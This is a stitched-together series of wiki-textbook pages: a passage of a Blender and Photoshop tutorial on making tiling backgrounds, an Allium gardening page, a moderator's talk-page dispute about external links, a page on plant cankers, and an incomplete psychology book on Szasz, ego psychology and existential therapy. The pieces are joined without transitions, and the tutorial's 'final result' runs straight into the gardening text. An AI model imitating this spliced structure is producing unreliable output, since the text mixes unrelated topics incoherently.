With your cube object still selected, press &quot;'''Alt+D'''&quot; to make a linked duplicate. ''(Non-linked duplication is done with &quot;Shift+D&quot;)'' Now hold down &quot;'''Ctrl'''&quot; to move in set increments and move the object to one of the corners of our plane. Make sure the center of the object (represented by a pink dot) is aligned with the very corner of the plane. At this point you may notice it's somewhat difficult to tell whether the center of the object is exactly on the corner of the plane, and that's why we are going to press &quot;'''NumPad 5'''&quot; or click &quot;'''View'''&quot; and select &quot;'''Orthographic'''&quot;. For all practical purposes we can spend the rest of the time we are building the tiling pattern in Orthographic View because this view is essential for tiling.

[[Image:3dbg-persp-ortho.jpg]]

Now with your duplicate object still selected, scale it (&quot;'''S'''&quot; key) so that is somewhat smaller than the first. Then rotate it using the &quot;'''R'''&quot; key. While rotating you can constrain to a particular axis by typing &quot;'''X'''&quot;, &quot;'''Y'''&quot;, or &quot;'''Z'''&quot; respectively.

We will now make linked duplicates ('''Alt+D''') of our rotated and scaled cube object and place one in each corner exactly on the grid (remember to hold &quot;'''Ctrl'''&quot; while dragging). If you place an object in one corner, you must place it in all four corners because corners touch both the X axis and the Y axis. 

[[Image:3dbg-scale&amp;dup.jpg]]

Now as you will notice in the following diagram, I made an object that is crossing over the edge of our plane. This is good. This is how to make natural tiling backgrounds. However! Whenever we do this we must be absolutely certain to do the same on the opposite side, or else our backgrounds will not tile properly. 

[[Image:3dbg-boundaries.jpg]]

So now we've created a few objects of different sizes and orientations, however they have all been along the same spot on the '''Z''' axis. So let's give our pattern some depth - after all, that is the joy of working in 3D! 

Before we do this, we'll want to get our guide plane out of the way. So '''right click''' on the plane to select it, then &quot;'''Tab'''&quot; into '''Edit Mode'''. Press &quot;'''X'''&quot; and from the '''Erase''' menu choose &quot;'''Only Faces'''&quot;. Now &quot;'''Tab'''&quot; back into '''Object Mode'''. There! We now have only the segments of the plane as our guide. 

[[Image:3dbg-deletefaces.jpg]]

Hold down the '''middle mouse button''' while dragging the mouse to see what our design looks like in three dimensions. Now right click one of the cube objects, duplicate a linked copy ('''Alt+D'''), and press &quot;'''Z'''&quot; to constrain movement to the Z axis. 

[[Image:3dbg-zmove.jpg]]

Navigate in this way along the '''X''' and '''Y''' axis as well and once you've found a good spot, '''scale''' and '''rotate'''. Remember to make a duplicate on the opposite side whenever you cross the outline of the plane guide. You can go on like this and populate your tiling pattern with as many objects as you wish. The grid is your friend during this process, so you should always have your finger on &quot;'''Ctrl'''&quot; while moving the duplicate of an object that crosses a border of the guide plane. Also, any object that will &quot;tile&quot; across the border must be at the same point on the '''Z''' axis as its counterpart on the other side of the seam. Press &quot;'''NumPad 7'''&quot; periodically to see where you are from a 2D standpoint. This is the view from which we will eventually render the image, so this perspective is the one that counts. Beginners, remember that '''mouse wheel''' zooms in and out, and &quot;'''Shift+middle mouse button'''&quot; allows you to &quot;drag&quot; your way around.

[[Image:3dbg-populated.jpg]]

Keep in mind that in '''Orthographic View''' we do not perceive the depth of objects. Those far away and those near by appear to be at the same distance. This is what allows us to make a tiled image, but it also limits the apparent depth of the scene. We can compensate for this by scaling down the objects we want to appear further away. Or, as in this example, we can just make each object a different size and place some in front of others. 

----

== Camera Settings ==
We will now position the camera directly over our cluster of objects. Press &quot;'''NumPad 7'''&quot;, center the view on the cluster using &quot;'''Shift+middle mouse button'''&quot;, and zoom out a couple notches with the '''mouse wheel'''. From the '''3D View Window''''s menu, click &quot;'''View'''&quot; '''&gt;''' &quot;'''Align View'''&quot; '''&gt;''' &quot;'''Align Active Camera to View'''&quot;. 
Now you may be wondering why everything appears to be distorted. This is because when we changed to the camera's perspective, the view automatically reverted to '''Perspective View''' because by default the camera is set to that view. But just as we changed to '''Orthographic View''' in the 3D View Window, we can change the view of the camera as well. 
While in '''Object Mode''', swivel the view until you see the camera. It is represented by a pyramidal wireframe with a black triangle atop the opening. '''Right click''' to select it. Now press &quot;'''F9'''&quot; or click the '''Editing''' button (it's icon is four vertices joined in a square). Now in the '''Camera''' panel you will see a button labelled &quot;'''Orthographic'''&quot;. Press it. Above the button is a value labelled '''Scale'''. Set it to around 20. (See figure below)

[[Image:3dbg-orthocamera.jpg]]

----

== Lighting &amp; Materials ==
Place some lights in your scene, and add some materials to your objects. '''Lighting''' and '''materials''' are subjects which demand their own tutorials, so if you don't know how to do these things yet, please consult the Wiki. 

'''Note:''' I advise lighting your scene pretty evenly in order to make the tiling seem contiguous.

'''Note:''' You could also only use Sun lamp, so the light is clean all over the mesh!

----

== Rendering ==
Now that you've presumably got your lighting and materials as you want them, it's time to render the scene. Under '''User Preferences''' click &quot;'''Render'''&quot; '''&gt;''' &quot;'''Render Settings'''&quot; or just press &quot;'''F10'''&quot;. In the '''Format''' tab you can choose the dimensions of your rendered image, the file format you prefer, and the quality. I'm going with 800x600 at 100% quality. 

----

== 'Shopping ==
And it's time to begin post-production. Open your rendered image in your preferred image editor. I will be using Photoshop in this example. Now find and mark the four corners of your tile (on a new layer of course). Just eyeball it.

We will use guides to mark the tile boundaries. In Photoshop guides can be inserted by selecting &quot;'''View'''&quot; '''&gt;''' &quot;'''New Guide...'''&quot;. Guides can be positioned with the '''Move Tool'''. You can zoom in and make sure your guides are accurately positioned by holding &quot;'''Ctrl'''&quot; while typing &quot;'''+'''&quot; or &quot;'''-'''&quot;. You can now hide or delete the layer with the markers, as that was only to help us get accurate guides. 

Should you decide to make an animated tiling background I recommend layering all your frames on top of one another in your image editor before editing in order to keep the position uniform. You can then animate them using Adobe ImageReady (comes with Photoshop) or find decent low-budget and occasionally free GIF animation programs online. 

[[Image:3dbg-guides.jpg]]

Now select an area just ''outside'' of the guides with the '''Marquee Tool'''. Make sure &quot;'''Feather'''&quot; is set to '''0px''' and that the marquee is rectangular and '''Style''' is set to '''Normal''' (meaning no Fixed Aspect Ratio or Fixed Size). Also, it will help you to have '''Snap''' enabled, so go to &quot;'''View'''&quot; and make sure it is enabled for guides. 

Once you have selected the area, copy ('''Ctrl+C''') and paste ('''Ctrl+V'''). Then drag to the right using the '''Move Tool''' and that piece should snap to the inside of the rightmost vertical guide. 

[[Image:3dbg-copypaste.jpg]]

Select the Eraser Tool and choose a brush size. I'm going with a diameter of 65. You'll want to use a soft gradient-like brush for this. Now erase the left edge of the newly pasted selection so that it blends into the picture. Don't erase any of the right edge. 

[[Image:3dbg-eraseseam.gif]]

Press &quot;'''Ctrl+E'''&quot; or alternatively, select &quot;'''Layer'''&quot; '''&gt;''' &quot;'''Merge Down'''&quot;. 

Alright, so that procedure you just performed copying from left to right - now do it bottom to top. Once again, erase the edge. Do a '''Save As'''.

Finally, select the square center area that will become your tile and do &quot;'''Image'''&quot; '''&gt;''' &quot;'''Crop'''&quot;. 

Now scale your new tiling background to a web-friendly size. '''Save As''' a JPEG, GIF, or PNG. '''You're done!'''

''Note:If your pattern still isn't tiling quite perfectly, load the version with the guides again and repeat the copy-paste-erase process. Remember to merge down your layers each time or the corners may not tile correctly. If still no joy, try tiling the background in a web browser, taking a screenshot, pasting that into your graphics editor, and touching up from there.'' 

Here is the final result:

'''''Allium''''' is the genus which includes both Onions and Garlics, with about 1250 species, making it one of the largest plant genera in the world. They are perennial bulbous plants that produce chemical compounds that give them a characteristic onion or garlic taste and odor, and many are used as food plants. Allium is classified in family Alliaceae although some classifications have included it in the lily family (Liliaceae).

Members of the genus include many valued vegetables such as onions, shallots, leeks and herbs such as garlic and chives. A strong &quot;oniony&quot; odor is characteristic of the whole genus, but not all members are equally flavorful.

==Description==
''Allium'' species occur in temperate climates of the northern hemisphere, except for a few species occurring in Chile (as ''Allium juncifolium''),  Brazil (''Allium sellovianum'') or tropical Africa (''Allium spathaceum''). They can vary in height between 5&amp;nbsp;cm and 150&amp;nbsp;cm. The flowers form an umbel at the top of a leafless stalk. The bulbs vary in size between species, from very small (around 2&amp;ndash;3&amp;nbsp;mm in diameter) to rather big (8&amp;ndash;10&amp;nbsp;cm). Some species (such as Welsh onion, ''A. fistulosum'') develop thickened leaf-bases rather than forming bulbs as such. 

Most bulbous alliums increase by forming little bulbs or &quot;offsets&quot; around the old one, as well as by seed. Several species can form many bulbils (tiny bulbs) in the flowerhead; in the so-called &quot;tree onion&quot; (A. cepa Proliferum Group) the bulbils are few, but large enough to be used for pickling.

==Growing conditions==
&lt;!--sun, soil, etc.--&gt;

''[[../Allium triquetrum/]]'' - three-cornered leek, triquetous garlic&lt;br&gt;
''[[../Allium tuberosum/]]'' - Chinese chives&lt;br&gt;
''[[../Allium ursinum/]]'' - wild garlic, ramsons&lt;br&gt;
''[[../Allium vineale/]]'' - crow garlic&lt;br&gt;
'''See [[w:List of Allium species|full list]].'''&lt;br&gt;

==Uses==
Some ''Allium'' species, including ''A. cristophii'' and ''A. giganteum'', are used as border plants for their flowers, and their &quot;architectural&quot; qualities. Several hybrids have been bred, or selected, with rich purple flowers. ''Allium hollandicum'' 'Purple Sensation' is one of the most popular and has been given an Award of Garden Merit (H4). By contrast, other species (such as the invasive ''Allium triquetrum'') can become troublesome garden weeds.

== External links ==

Hi - Wikibooks are intended as stand alone reading material in the form of textbooks - as such external links are rarely necessary.  Thanks --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 12:47, 17 March 2007 (UTC)
:Sorry but such links really are not appropriate to Wikibooks.  As I said above the idea is to create &quot;stand alone&quot; textbook content.  Thanks --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 07:31, 29 March 2007 (UTC)
::Ok - 
::# The link that you were placing is to a forum.  I am not aware that of other pages with links to forums.  These are such transient sites in terms of content that they will rarely be that relevant.
::# The site is uk specific while Wikibooks is worldwide.  If we allowed links to all such such from all around the world there would be nothing but links.
::Thanks --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 10:39, 29 March 2007 (UTC)

OK - I really am not prepared to enter into an argument with you.  I will happily consult other admins/the community to see if they agree.

The ability to &quot;find&quot; google groups is not really something that is that hard.  In practice I think the [http://wiki.diyfaq.org.uk/] is really quite a useful link (and as it in turn links to google groups that again makes that link redundant) and probably should be in somewhere (I assume there will be a link back to Wikibooks placed there?).

That you consider some article US centric is correct but they do not have links in and the answer of course in a Wiki is feel free to add UK relevant text.  Content is required not links.  Thank you  --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 12:57, 29 March 2007 (UTC)
:Sorry quite a lot of other stuff happened on this and other wikis!  I will definitely not removed the link to your wiki if you put it back (tho I would not want to see it on many pages so try and and find one or two good ones?).  Thanks --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 08:07, 30 March 2007 (UTC)</text>

[[Image:Baumkrebs-Birke.jpg|thumb|Canker on a birch]]
'''Canker''' is a general term for a large number of different plant diseases, characterised by broadly similar symptoms including the appearance of distorted, tumor-like growth and areas of dead tissue, which grow slowly, often over a period of years. Some are of only minor consequence, but others are ultimately lethal, and of major economic importance in agriculture and horticulture. Different cankers and anthracnoses are caused by a wide range of organisms, including fungi, bacteria,phytoplasmas and viruses. The majority of canker-causing organisms are tied obligately to a single host species or genus, but a few will attack a wider range of plants.

Some cankers are treatable with fungicides or bactericides, but many are not; often the only treatment available is to destroy the infected plant to prevent the disease from spreading to other plants.

==Bacterial Cankers==
*Ash bacterial canker, caused by the bacterium ''Pseudomonas syringae''
*Citrus canker, caused by the bacterium ''Xanthomonas axonopodis''
*Poplar canker, caused by the bacterium ''Xanthomonas populi''

==Fungal Cankers==
*Apple canker, caused by the fungi ''Nectria galligena''
*Butternut canker, caused by the fungus ''Sirococcus clavigigenti-juglandacearum''
*Cypress canker, caused by the fungus ''Seridium cardinale''

&lt;b&gt;&lt;center&gt;&lt;big&gt;&lt;big&gt;&lt;big&gt;&lt;big&gt;Fringe Psychology&lt;/center&gt;&lt;/big&gt;&lt;/big&gt;&lt;/big&gt;&lt;/big&gt;&lt;/b&gt;



The mind is a rather interesting phenomenon. Supposedly, the big bang occurred billions of years ago, and since then, a multitude of developments have occurred. The cosmos have formed. Galaxies have come into being. Solar systems manifested, as did planets. Earth is one of those planets. 

Life arose. The earth stewed, for billions of more years. At some point, animals evolved neurons, and eventually collections of neurons, now referred to as &quot;brains&quot;. Fish evolved. Huge lizards, perhaps both peaceful and violent roamed the earth. They mostly all died out; we have alligators now, and if you go to Florida, you can eat them. 

Furry animals evolved. From these furry animals human-like animals evolved; eventually, humans evolved. For many thousands of years they did not do a whole lot. They ate, mated, and died. Eventually the population exploded; technology advanced. Agriculture reached a point where humans started to have a lot of spare time, and with this spare time humans began to study things not directly related to their immediate survival. Psychology is one of these things. 

This book assumes you have a general understanding of what psychology is and what it is not. Perhaps you've taken some introductory courses in college. 

Let's refresh your memory.

Psychology is an academic or applied discipline involving the scientific study of mental processes such as perception, cognition, emotion, personality, behavior, and interpersonal relationships. Psychology also refers to the application of such knowledge to various spheres of human activity, including problems of individuals' daily lives and the treatment of mental health problems.

==History of Psychology==

In 1879, Wilhelm Wundt (1832-1920), known as &quot;the father of psychology&quot;, founded a laboratory for the study of psychology at Leipzig University in Germany. The American philosopher William James published his seminal book, Principles of Psychology, in 1890, laying the foundations for many of the questions that psychologists would focus on for years to come. Other important early contributors to the field include Hermann Ebbinghaus (1850–1909), a pioneer in the experimental study of memory at the University of Berlin; and the Russian physiologist Ivan Pavlov (1849-1936), who investigated the learning process now referred to as classical conditioning.

Meanwhile, during the 1890s, the Austrian physician Sigmund Freud, who was trained as a neurologist and had no formal training in experimental psychology, had developed a method of psychotherapy known as psychoanalysis. Freud's understanding of the mind was largely based on interpretive methods and introspection, and was focused in particular on resolving mental distress and psychopathology. Freud's theories became very well-known, largely because they tackled subjects such as sexuality and repression as general aspects of psychological development. These were largely considered taboo subjects at the time, and Freud provided a catalyst for them to be openly discussed in polite society. Although Freud's theories are only of limited interest in modern academic psychology departments, his application of psychology to clinical work has been very influential.

Behaviorism reigned as the dominant model in psychology throughout the first half of the 20th century, largely due to the creation of conditioning theories as scientific models of human behavior, and their successful application in the workplace and in fields such as advertising and military science.

==Goals of Psychology==
Goals of psychology include:

Psychology describes and attempts to explain consciousness, behavior and social interaction. Empirical psychology is primarily devoted to describing human experience and behavior as it actually occurs. In the past 20 years or so psychology has begun to examine the relationship between consciousness and the brain or nervous system. It is still not clear in what ways these interact: does consciousness determine brain states or do brain states determine consciousness - or are both going on in various ways? Perhaps to understand this you need to know the definition of &quot;consciousness&quot; and &quot;brain state&quot; - or is consciousness some sort of complicated 'illusion' which bears no direct relationship to neural processes? An understanding of brain function is increasingly being included in psychological theory and practice, particularly in areas such as artificial intelligence, neuropsychology, and cognitive neuroscience.

Various schools of thought have argued for a particular model to be used as a guiding theory by which all, or the majority, of human behavior can be explained. The popularity of these has waxed and waned over time. Some psychologists may think of themselves as adherents to a particular school of thought and reject the others, although most consider each as an approach to understanding the mind, and not necessarily as mutually exclusive theories.

Psychology is an extremely broad field, encompassing many different approaches to the study of mental processes and behavior. Below are the major areas of inquiry that comprise psychology, divided into fields of research psychology and fields of applied psychology.

Although modern psychology attempts to be a scientific endeavour, the field has a history of controversy. Some criticisms of psychology have been made on ethical and philosophical grounds. Some have argued that by subjecting the human mind to experimentation and statistical study, psychologists objectify persons. Because it treats human beings as things, as objects that can be examined by experiment, psychology is sometimes portrayed as dehumanizing, ignoring or downplaying what is most essential about being human. This criticism has come from within the field as well, particularly by existential and humanistic psychologists.

;Not everyone is happy about psychology

A common criticism of psychology concerns its fuzziness as a science. Philosopher Thomas Kuhn suggested in 1962 that psychology is in a pre-paradigmatic state, lacking the agreement on facts found in mature sciences such as chemistry and physics. Because some areas of psychology rely on &quot;soft&quot; research methods such as surveys and questionnaires, critics have claimed that psychology is not as scientific as psychologists assume. Methods such as introspection and psychoanalysis, used by some psychologists, are inherently subjective. Objectivity, validity, and rigour are key attributes in science, and some approaches to psychology have fallen short on these criteria. On the other hand, greater use of statistical controls and increasingly sophisticated research design, analysis, and statistical methods, as well as a decline (at least within academic psychology departments) in the use of less scientific methods, have lessened the impact of this criticism to some degree.

There is also concern from researchers about a perceived scientific gap between empirically based practices. Exponents of evidence-based approaches to psychological practice say that &quot;over the past several decades, the fields of clinical psychology, psychiatry, and social work have borne witness to a widening and deeply troubling gap between science and practice&quot; and &quot;less and less of what researchers do finds its way into the consulting room, and less and less of what practitioners do derives from scientific evidence.&quot; Moreover there are many &quot;unvalidated and sometimes harmful psychotherapeutic methods&quot; that have been widely adopted by the profession.

Psychology differs from the other social sciences (e.g., anthropology, economics, political science, and sociology) due to its focus on experimentation at the scale of the individual, as opposed to groups or institutions. Historically, psychology differed from biology and neuroscience in that it was primarily concerned with mind rather than brain, a philosophy of mind known as dualism. However, modern psychological science incoporates physiological and neurological processes into its conceptions of perception, cognition, behavior, and mental disorders.

This book goes beyond a general introduction of psychology and begins to introduce the reader to different topics in psychology. A general understanding of basic psychological principles is presumed.

For the time being, content will be copied to this page, and at a point where it seems prudent, the content will be organized in a more succinct manner.

=== &lt;center&gt;Thomas Szasz&lt;/center&gt; ===

Dr. Thomas Stephen Szasz (born April 15, 1920 in Budapest, Hungary), is Professor Emeritus of Psychiatry at the State University of New York Health Science Center in Syracuse, New York. He is a prominent figure in the antipsychiatry movement, a well-known critic of the moral and scientific foundations of psychiatry, and of the social control aims of medicine in modern society, as well as of scientism. Szasz is affiliated with Scientology's anti-psychiatric organizations, though he does not belong to the church itself. He is well known for his books, The Myth of Mental Illness (1960) and The Manufacture of Madness: A Comparative Study of the Inquisition and the Mental Health Movement which set out some of the arguments with which he is most associated.

While people behave and think in ways that are very disturbing, this does not mean they have a disease. To Szasz, people with mental illness have a &quot;fake disease,&quot; and these &quot;scientific categories&quot; are in fact used for power controls. Schizophrenia is &quot;the sacred symbol of psychiatry&quot;. To be a true disease, the entity must somehow be capable of being approached, measured, or tested in scientific fashion. According to Szasz, disease must be found on the autopsy table and meet pathological definition instead of being voted into existence by members of the American Psychiatric Association. Mental illnesses are &quot;like a&quot; disease, argues Szasz, putting mental illness in a semantic metaphorical language arts category. 

Psychiatry, through various Mental Health Acts has become the secular state religion according to Thomas Szasz. It is a social control system, which disguises itself under the claims of scientificity. The notion that biological psychiatry is a real science or a genuine branch of medicine has been challenged by other critics as well, such as Michel Foucault in Madness and Civilization (1961).

=== &lt;center&gt;Ego Psychology&lt;/center&gt; === 
There are different ways of viewing the mind and consciousness. Ego psychology is one of these ways. Many practitioners incorporate ego psychology into their paradigm of the mind and correspondingly, their practice.

The central functions of the ego were traditionally seen as reality-testing, impulse-control, judgment, affect tolerance, defence, and synthetic functioning. An important conceptual revision to Freud's structural theory was made when Heinz Hartmann argued that the healthy ego includes a sphere of autonomous ego functions that are independent of mental conflict. Memory, motor coordination, and reality-testing, for example, ought to be able to function without the intrusion of emotional conflict. According to Hartmann, psychoanalytic treatment aims to expand the conflict-free sphere of ego functioning. By doing so, Hartmann believed, psychoanalysis facilitates adaptation, that is, more effective mutual regulation of ego and environment.

Ego psychology is often confused with self psychology, which emphasizes the strength and cohesion of a person's sense of self. Although some ego psychologists write about the self, they usually distinguish the self from the ego. They define the ego as an agency comprised of mental functions, whereas the self is an internal representation of how one sees oneself. In ego psychology, emphasis is placed on understanding the functioning of the ego and its conflicting relations to the id, superego, and reality, rather than on the subjective sense of self.

Some have also accused Hartmann of proposing a conformist psychology in which the ego is considered most healthy when it adjusts to the status quo. Hartmann claimed, however, that his aim was to understand the mutual regulation of the ego and environment rather than to promote adjustment of the ego to the environment.

Also, Jacques Lacan, a prominent psychoanalyst, had a certain disdain for ego-psychology. He took issue with the movement insofar as his form of psychoanalysis focuses on the unconscious. It also splits the ego and theorizes how one never has a true relation to their ego because it is an illusionary relationship to an ideal image, and is a product of the unconscious itself.

After Freud, a number of prominent psychoanalytic theorists began to elaborate on Freud's functionalist version of the ego. They put much effort into theorizing the ego's various functions and how they can be impaired in psychopathology. Much of their work focused around strengthening the ego so it could better cope with the pressures from the id, super-ego, and society in general.

David Rapaport systematized Freud's structural model and Hartmann's revisions of it. Rapaport argued that the central principle of Freudian theory is that mental processes are motivated and shaped by the need to discharge tension. Clarifying Freud's work, Rapaport portrayed the mind as divided into drives and structures. Drives contain fluid energy that pushes for rapid discharge through the immediate gratification of wishes. Because it is rare that wishes can actually be immediately gratified, the mind develops the capacity to delay gratification or achieve it through detours. Consequently, drive energy becomes tied up in the relatively stable mental structures comprising the ego. Rapaport defined structures as mental organizations with a slow rate of change, slow in comparison with the more fluid drives.

The clinical technique most commonly associated with ego psychology is defense analysis. Through clarifying, confronting, and interpreting the typical defense mechanisms a patient uses, ego psychologists hope to help the patient gain control over these mechanisms.

Arlow and Brenner argued that Freud's earlier theory of the conscious, preconscious, and unconscious systems of the mind ought to be abandoned, and the structural model used as the sole psychoanalytic theory of the mind.

Recent ego psychological authors have taken the approach in a number of directions. Some, such as Charles Brenner, have contended that the structural model should be abandoned and psychoanalysts should focus exclusively on understanding and treating mental conflict. Others, such as Frederic Busch, have argued for an increasingly nuanced and sophisticated concept of the ego.

Many authors have criticized Hartmann's conception of a conflict-free sphere of ego functioning as both incoherent and inconsistent with Freud's vision of psychoanalysis as a science of mental conflict. Freud believed that the ego itself takes shape as a result of the conflict between the id and the external world. The ego, therefore, is inherently a conflicting formation in the mind. To state, as Hartmann did, that the ego contains a conflict-free sphere may not be consistent with key propositions of Freud's structural theory.

=== &lt;center&gt;Existential Therapy &lt;/center&gt;===
Existential therapy focuses on the development of a patient/client’s self-awareness by looking deeply into the issues of our aloneness, meaninglessness, and mortality. The therapist emphasizes the patient/client’s ability to freely make choices in the present, not under the influence of deterministic aspects or past conditioning. The existentialist attempts to convert meaninglessness into meaningfulness, giving the patient/client the courage to make his or her own healthy choices and to lead a socially rewarding life. Existential therapists have their own unique views about human nature, mental dysfunction, wellness, and therapeutic techniques.

Existential psychotherapy is partly based on the existential belief that human beings are alone in the world. This aloneness leads to feelings of meaninglessness which can be overcome only by creating one’s own values and meanings. We have the power to create because we have the freedom to choose. In making our own choices we assume full responsibility for the results and blame no one but ourselves if the result is less than what was desired. The psychotherapist helps his or her patients/clients along this path: to discover why the patient/client is overburdened by the anxieties of aloneness and meaninglessness, to find new and better ways to manage these anxieties, to make new and healthy choices, and to emerge from therapy as a free and sound human being.

Although humans are essentially alone in the world, we long to be connected to others. We want to have meaning in their lives while they have meaning in ours, but ultimately we must come to realize that we cannot depend on others for our validation, and with that realization we finally acknowledge and understand that we are fundamentally alone. The result of this revelation is anxiety in the knowledge that our validation must come from within and not from others. This anxiety is a positive thing, since it makes us aware of the limits of human existence and this makes us capable of reflecting on life instead of living thoughtlessly.

Because we are alienated and isolated our lives are also meaningless. Nothing exists which is greater than ourselves, therefore there are no external sources of values and absolutes from which we can draw. Taken to an extreme we might conclude that there is nothing for which to live, however, there is hope in the possibility of creating our own values and our own meanings and applying them to our condition, giving us feelings of significance and purpose that are strong enough to carry us through life. This freedom we have to choose our own values is another source of anxiety: we must summon the requisite strength and courage to choose our life-meaning and hold fast to it, undoubtedly a task which many find difficult.

Human beings are also mortal. As we come to grips with the fact that our lives are limited, we develop even more anxiety: we are afraid of death. The knowledge that at some point in the future we will cease to be, while frightening, is at the same time invigorating because it is relevant right now. The juxtaposition of life and death is one thing that does give us some certainty.

Finally, humans are responsible. Being isolated, alone, and free to choose means that one cannot assign blame for his or her problems to someone else. The individual alone makes the choices and therefore is responsible for the outcomes. At any point we are free to make different choices and thus re-invent ourselves; we are at once the architect, the planner, and the builder of our lives, throughout our lives.

The existentially-oriented psychotherapist guides his or her patients/clients to confront life’s anxieties. If the patient/client has not been fully exercising the freedom to choose, the counselor will lead a discovering into how and why he or she is stuck. Perhaps the patient/client has been allowing others to make the important decisions which he or she alone should be making. Possibly the patient/client is afraid to take the risks required to grow and is instead choosing an easy and non-threatening path. The counselor will encourage his or her patient/clients to reflect on the aloneness and meaninglessness of life, and to understand that they must find their own ways to cope with these anxieties. The counselor does not try to eliminate these anxieties, but instead encourages the patient/client to face them head-on. Alternative paths can be explored together. The risks entailed with these paths can be evaluated, and then the patient/client will be able to make new, more authentic choices. The existential counselor is not overly concerned with the patient's/client’s past. Instead, the emphasis is on the choices to be made in the present. The counselor and the client may reflect upon how the client has answered life’s questions in the past, but then attention shifts to searching for a new and increased awareness in the present and enabling a new freedom and responsibility to act.

It is possible for people to face the anxieties of life head-on and embrace the human condition of aloneness, to revel in the freedom to choose and take full responsibility for their choices. They courageously take the helm of their lives and steer in whatever direction they choose; they have the courage to be. One does not need to arrest feelings of meaninglessness, but can choose new meanings for their lives. By building, by loving, and by creating one is able to live life as one's own adventure. One can accept one's own mortality and overcome fear of death.

=== &lt;center&gt;Rollo May&lt;/center&gt; ===
Rollo May (April 21, 1909, Ada, Ohio - October 22, 1994, Tiburon, California) was the best known American existential psychologist, authoring the influential book Love and Will in 1969.

Although he is often associated with humanistic psychology, he differs from other humanistic psychologists such as Maslow or Rogers in showing a sharper awareness of the tragic dimensions of human existence. May was a close friend of the U.S. German-born theologian Paul Tillich. His works include Love and Will and The Courage to Create, the latter title honoring Tillich's The Courage to Be.

May was influenced by American humanism, and interested in reconciling existential psychology with other approaches, especially Freud’s.

May uses some traditional existential terms in a slightly different fashion than others, and he invents new words for traditional existentialist concepts. Destiny, for example, could be &quot;thrownness&quot; combined with &quot;fallenness&quot;— the part of our lives that is determined for us, for the purpose of creating our lives. He also used the word &quot;courage&quot; to signify authenticity in facing one’s anxiety and rising above it.

He saw certain &quot;stages&quot; of development:

* Innocence – the pre-egoic, pre-self-conscious stage of the infant. The innocent is only doing what he or she must do. However, an innocent does have a degree of will in the sense of a drive to fulfill needs.
* Rebellion – the rebellious person wants freedom, but has yet no full understanding of the responsibility that goes with it.
* Decision- the person is in a transition stage in their life where they need to break away from their parents and settle into the ordinary stage. In this stage they must decide what path their life will take along with fulfilling rebellious needs from the rebellious stage.
* Ordinary – the normal adult ego learns responsibility, but finds it too demanding, and so seeks refuge in conformity and traditional values.
* Creative – the authentic adult, the existential stage, beyond ego and self-actualizing. This is the person who, accepting destiny, faces anxiety with courage.[citation needed]

These are not stages in the traditional sense. A child may certainly be innocent, ordinary or creative at times; an adult may be rebellious. The only attachment to certain ages is in terms of salience: rebelliousness stands out in the two year old and the teenager.

May perceived the sexual revolution of the 1960s and 1970s, as well as commercialization of sex and pornography have influenced society and planted the idea in the minds of adults that love and sex are no longer directly associated. According to May, emotion has become separated from reason, making it socially acceptable to seek sexual relationships and avoid the natural drive to relate to another person and create new life. May believed the awakening of sexual freedoms can lead modern society to dodge awakenings at higher levels. May suggests that the only way to turn around the cynical ideas that characterize our generation is to rediscover the importance of caring for another, which May describes as the opposite of apathy.

His first book, The Meaning of Anxiety, was based on his doctoral dissertation, which in turn was based on his reading of the 19th century philosopher Søren Kierkegaard. His definition of anxiety is &quot;the apprehension cued off by a threat to some value which the individual holds essential to his existence as a self&quot; (1967, p. 72.) He also quotes Kierkegaard: &quot;Anxiety is the dizziness of freedom&quot;. In 1956, he edited the book Existence with Ernest Angel and Henri Ellenberger. Existence helped introduce existential psychology to the US.

=== &lt;center&gt;Fritz Perls&lt;/center&gt; ===
Fritz Perls was born in Berlin in 1893. He was expected to go into law like his distinguished uncle Herman Staub, but instead studied medicine. After a time spent in the German Army in the World War I trenches, he graduated as a doctor. Perls gravitated to psychiatry and the work of Freud and the early Wilhelm Reich.

In 1930 he married Lore Posner, they had two children together, Renate and Stephen.

In 1933, soon after the Hitler regime came into power, Fritz Perls, Laura and their eldest child Renate fled to the Netherlands, and one year later they emigrated to South Africa, where Fritz Perls wrote Ego, Hunger, and Aggression in 1941 (published 1942). His wife Laura contributed to the book, but she is usually not mentioned. In 1942 Fritz went into the South African army where he served as an army psychiatrist with rank of captain until 1946.

The Perls moved to New York in 1946, where Fritz Perls first worked briefly with Karen Horney, and then with Wilhelm Reich. Around 1947, Perls asked author Paul Goodman to write up some hand-written notes, which together with contributions from Ralph Hefferline and Goodman, were published as Gestalt Therapy.

Fritz Perls moved to California in 1960, where he continued to offer his workshops as a member of the Esalen Institute in Big Sur, until he left the USA to start a Gestalt community at Lake Cowichan on Vancouver Island, Canada, in 1969. Fritz Perls died almost a year later on 14th March 1970 in Chicago of heart failure after surgery at the Louis A. Weiss Memorial Hospital in Chicago.

=== &lt;center&gt;Social Psychology &lt;/center&gt;===
The terms thoughts, feelings, and behaviors include all of the psychological variables that are measurable in a human being. The statement that others may be imagined or implied suggests that we are prone to social influence even when no other people are present, such as when watching television, or following internalized cultural norms.

